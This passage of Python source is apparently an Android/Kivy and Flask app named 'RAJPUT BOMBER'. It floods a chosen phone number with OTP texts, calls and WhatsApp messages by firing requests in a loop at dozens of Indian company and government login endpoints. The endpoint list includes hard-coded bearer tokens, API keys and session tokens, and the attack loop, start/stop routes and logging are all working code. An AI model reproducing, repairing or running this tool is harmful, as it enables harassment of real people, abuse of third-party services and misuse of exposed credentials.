    {"url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.pw.live", "randomid": "494dfb28-1e43-4aa2-bc78-ecc1f99aa1a5"}, "data": lambda phone: f'{{"mobile":"{phone}","countryCode":"+91","subOrgId":"SUB-PWLI000"}}'},
    {"url": "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://account.relianceretail.com", "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI5LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzU3MDQzMjE4LCJzYWx0IjowfQ.f2c844dH_df5Hf0y1mIXipqTX8BMgUzbNDe-sV7jEdI"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://www.shopsy.in/2.rome/api/1/action/view", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.shopsy.in", "x-user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36 FKUA/msite/0.0.4/msite/Mobile"}, "data": lambda phone: f'{{"actionRequestContext":{{"loginIdPrefix":"+91","loginId":"{phone}","clientQueryParamMap":{{"ret":"/","entryPage":"HEADER_ACCOUNT"}},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT","type":"LOGIN_IDENTITY_VERIFY"}}}}'},
    {"url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"contactNumber":"{phone}","domainId":"2"}}'},
    {"url": "https://www.olx.in/api/auth/authenticate?lang=en-IN", "method": "POST", "headers": {"content-type": "application/json", "Origin": "https://www.olx.in"}, "data": lambda phone: f'{{"grantType":"retry","method":"call","phone":"+91{phone}","language":"en-IN"}}'},
    {"url": "https://www.swiggy.com/dapi/auth/signup", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.swiggy.com"}, "data": lambda phone: f'{{"mobile":"{phone}","name":"Robert Hofman","email":"5n06uwcbog@jkotypc.com","referral":"","otp":"","_csrf":""}}'},
    {"url": "https://www.swiggy.com/dapi/auth/sms-otp", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.swiggy.com"}, "data": lambda phone: f'{{"mobile":"{phone}","_csrf":""}}'},
    {"url": "https://walletapi.mobikwik.com/walletapis/redirectflow/otpgenrate/resendotp?epayVersion=v1", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://e-pay.mobikwik.com", "x-mclient": "27"}, "data": lambda phone: f'{{"id":"MNRF-68d57d9ce4b0126bac8bc8ba","cell":"{phone}","otpSource":1}}'},
    {"url": "https://accounts.zomato.com/login/phone", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0"}, "data": lambda phone: f"csrf_token=CSRF_HERE&number={phone}"},
    {"url": "https://www.urbanclap.com/api/v2/growth/web/initiateLogin", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.urbancompany.com", "x-brand-key": "urbanCompany"}, "data": lambda phone: f'{{"city_key":null,"countryId":"IND","phoneNumber":"{phone}","integrityToken":"0.7mCEQBEjvzOD-BNLhoFLrkg6gmIW_R7fw5vHYAD1GXI1I-qZWxuFuZ51BX6991YvE5prKWBzk7yyswpUm9KbZ3QW4GVnswdACKtWbWJjTCdlS_O5FkIfdPa4POTE7aPRf6o6U67_3cFtfYjYwC4PT_BYOJ0PXvKdXkwKEDgozb5LpdkYrOPN4BkxjPdtRSLkmUfMZfnFe7K8wJIq4ojDLs79N2pjHpPadcRaagt8Mc6RJcnWDua3pi9UYhYsPGQ-Ee4N784S1bzR1H8N0tmh-WD40EGwreFIwaSTKhiBsoeIJMHeko_VJCo43c0GNC8PvaejepHp8oYe9WB4WDlYNKShJQkTsGiCxs1JJa4LvYasadvB_44d3FrwXsTSum9oTDFjIT7PHSPFftpEVYVFEFoPHRp5VbvYsVe9_8dRbxCYSPKaJgDSs_Ap7Lhc0qibHOrEPTaZYXFIpgfXmBrs_svG-4ZHNG0wcoNv8njq95tnl6mqf_b2MC2ZjefkwrPmssCA6vWc_KbxsV4mrNBsUaHSj2_eGNFtU5Rp4L0y9HivvMo0mJeyayiymmug63hY9wdCSuGrdCqBjlpnVM6jTxbYjL7Y32DrhX0Vec294onwRCok11p9CLY1MG1hhMlur70MFSaQ4dvIQgYA628pTBDVfVEyU5SHmyltgJiGL_KLESkEbU9YB6bi4s9Wk70z04XpVEMlLnP0iNn6_Nn5thercTDKEJQlLsWMayTDjqf6OpALSW1aBbs27MMlzTpr0iol7K8fkpNYkVZiy5fCaFzX4VBvrcTJerzY6tD1mu8vyvAp-vEcTPyzm43pTr7FimwKZj1CemnzVRXt0MgtAGQLY2oJ3c_HHYJuDigWvT6sWu-bSKwUIBUt9-Vw9GuMQj8AlG_CiZ2H2K3BZWLTPTJwZrNEtYqTK1q5bFRXNrAfTXFSunF61xeriFg5y1HC9ml228xSqr-eQ9ty7J3XUw.besfJV3LJwFiY4aeoaSnlA.668696d45fc89b33f6dfcccb14c979930cf7d9e581c353203ccd4466fadfc08c","integrityType":"captcha","userType":"customer","loginType":"otp"}}'},
    {"url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"check_mobile_number=1&contact={phone}"},
    {"url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json", "Authorization": "e57868edb066b4e04cbf0de4679acc3d3739d1ec0479fdccec2a5c6ff0b919"}, "data": lambda phone: f'{{"query":"mutation SendOtp($mobile:String, $isdCode:String, $otpType:String, $email:String){{SendOtp(input:{{mobile:$mobile, isdCode:$isdCode, otpType:$otpType, email:$email}}){{status{{message code}}}}}}","variables":{{"mobile":"{phone}","isdCode":"91","otpType":"registerOtp"}}}}'},
    {"url": "https://www.shemaroome.com/users/mobile_no_signup", "method": "POST", "headers": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile_no=+91{phone}&registration_source=organic"},
    {"url": "https://mybharat.gov.in/pages/sendGuestUserOtp", "method": "POST", "headers": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://mybharat.gov.in"}, "data": lambda phone: f"user_phone={phone}"},
    {"url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.lenskart.com", "X-Session-Token": "441def2c-7f4c-407d-ba7a-f97b5d078bec"}, "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'},
    {"url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://smytten.com", "desktop_request": "true", "request_type": "web"}, "data": lambda phone: f'{{"ad_id":"","device_info":{{}},"device_id":"","app_version":"","device_token":"","device_platform":"web","phone":"{phone}","email":"sdhabai09@gmail.com"}}'},
    {"url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "method": "GET", "headers": {"user-agent": "okhttp/3.9.1"}, "data": None},
    {"url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false", "method": "GET", "headers": {"user-agent": "Mozilla/5.0", "referer": "https://www.jockey.in/"}, "data": None},
    {"url": "https://app.getswipe.in/api/user/app_login", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://app.getswipe.in"}, "data": lambda phone: f'{{"mobile":"{phone}","otp":"","params":"","email":"","country_code":"IN"}}'},
    {"url": "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://onboarding.nuvamawealth.com", "api-key": "c41121ed-b6fb-c9a6-bc9b-574c82929e7e"}, "data": lambda phone: f'{{"contactInfo":"{phone}","mode":"SMS"}}'},
    {"url": "https://www.shopsy.in/2.rome/api/1/action/view", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://www.shopsy.in"}, "data": lambda phone: f'{{"actionRequestContext":{{"loginIdPrefix":"+91","loginId":"{phone}","clientQueryParamMap":{{"ret":"/","entryPage":"HEADER_ACCOUNT"}},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT","type":"LOGIN_IDENTITY_VERIFY"}}}}'},
    {"url": "https://jobsnagar.com:2083/otp-authentications", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda phone: f'{{"contact":"{phone}"}}'},
    {"url": "https://gopareto.bizmo-tech.com/user/register/generateOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://gopareto.bizmo-tech.com"}, "data": lambda phone: f"company_email=5n06uwcbog@jkotypc.com&company_name=robh&contact_no={phone}&company_address=7729+Center+Boulevard+Southeast&subscription=trial&employee_count=9&ip_addr=49.43.4.160&termsNCondi=1&index=1"},
    {"url": "https://oncast.in/wa_auth/generate_otp.php", "method": "POST", "headers": {"content-type": "application/json", "origin": "https://oncast.in"}, "data": lambda phone: f'{{"phone":"+91{phone}"}}'},
    {"url": lambda phone: f"https://baifo.me/m-wap/Register/SendOtpToBuyer?pluginId=BFMe.Plugin.Message.RongYun.SMS&destination={phone}&username=asdsadsadasd&countryCode=in&IsWa=wa", "method": "POST", "headers": {"origin": "https://baifo.me"}, "data": None},
    {"url": "https://www.cashify.in/api/cu01/v1/sign-up/resend-otp", "method": "PUT", "headers": {"x-app-installer": "cashify", "x-authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiY2FzaGlmeSIsImtpZCI6IjEyMDYyIiwicm9sZXMiOlsiY2FzaGlmeSJdLCJjbGlkIjoiZ2FkZ2V0LXBybyIsImNsdiI6InYxIiwiZXhwIjoxNzU4NTcxNjIxLCJ2dCI6MH0.T4gaAexVJHSgtO3DrASczvqMIym9qy8v8uwROPKV2Oo"}, "data": None}, 
    {"url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"contactNumber":"{phone}","domainId":"2"}}'},
    {"url": "https://www.olx.in/api/auth/authenticate?lang=en-IN", "method": "POST", "headers": {"content-type": "application/json", "Origin": "https://www.olx.in"}, "data": lambda phone: f'{{"grantType":"retry","method":"call","phone":"+91{phone}","language":"en-IN"}}'},
    {"url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"contactNumber":"{phone}","domainId":"2"}}'},
]

async def attack_task(phone):
    async with aiohttp.ClientSession() as session:
        while active_attacks.get(phone):
            for api in API_CONFIGS:
                if not active_attacks.get(phone): break
                try:
                    url = api["url"]
                    if callable(url): url = url(phone)
                    data = api["data"](phone) if callable(api["data"]) else api["data"]
                    headers = api.get("headers", {})
                    if api["method"] == "POST":
                        async with session.post(url, data=data, headers=headers) as r:
                            if r.status in [200, 201]: attack_logs[phone].append(f"HIT SUCCESS: {url[:20]}...")
                    else:
                        async with session.get(url, headers=headers) as r:
                            if r.status in [200, 201]: attack_logs[phone].append(f"HIT SUCCESS: {url[:20]}...")
                except: pass
            await asyncio.sleep(0.1)

def run_attack(phone):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(attack_task(phone))

@app.route('/')
def home(): return render_template_string(HTML_TEMPLATE)

@app.route('/start', methods=['POST'])
def start():
    p = request.json.get('phone')
    if p in PROTECTED: return jsonify({"status":"error", "message":"Protected!"})
    if active_attacks.get(p): return jsonify({"status":"error", "message":"Already Running"})
    active_attacks[p] = True
    attack_logs[p] = []
    threading.Thread(target=run_attack, args=(p,), daemon=True).start()
    return jsonify({"status":"success"})

@app.route('/stop', methods=['POST'])
def stop():
    p = request.json.get('phone')
    if p in active_attacks: active_attacks[p] = False
    return jsonify({"status":"success"})

@app.route('/logs/<p>')
def logs(p): return jsonify({"logs": attack_logs.get(p, [])})

# ==========================================
# 3. ANDROID LAUNCHER & AUDIO
# ==========================================
def start_webview(url):
    try:
        from jnius import autoclass
        from android.runnable import run_on_ui_thread
        WebView = autoclass('android.webkit.WebView')
        WebViewClient = autoclass('android.webkit.WebViewClient')
        activity = autoclass('org.kivy.android.PythonActivity').mActivity
        @run_on_ui_thread
        def create_view():
            wv = WebView(activity)
            wv.getSettings().setJavaScriptEnabled(True)
            wv.getSettings().setDomStorageEnabled(True)
            wv.setWebViewClient(WebViewClient())
            wv.loadUrl(url)
            activity.setContentView(wv)
        create_view()
    except: print("Not Android")

class MainApp(App):
    def build(self):
        return Label(text="STARTING RAJPUT BOMBER...", color=(0,1,1,1))
    
    def on_start(self):
        # --- 🎵 PLAY STARTUP SOUND (One Time) ---
        try:
            sound = SoundLoader.load('song.mp3')
            if sound:
                sound.play()
        except: pass
        # ----------------------------------------
        
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
        Clock.schedule_once(lambda dt: start_webview("http://127.0.0.1:5000"), 2)

if __name__ == '__main__':
    MainApp().run()
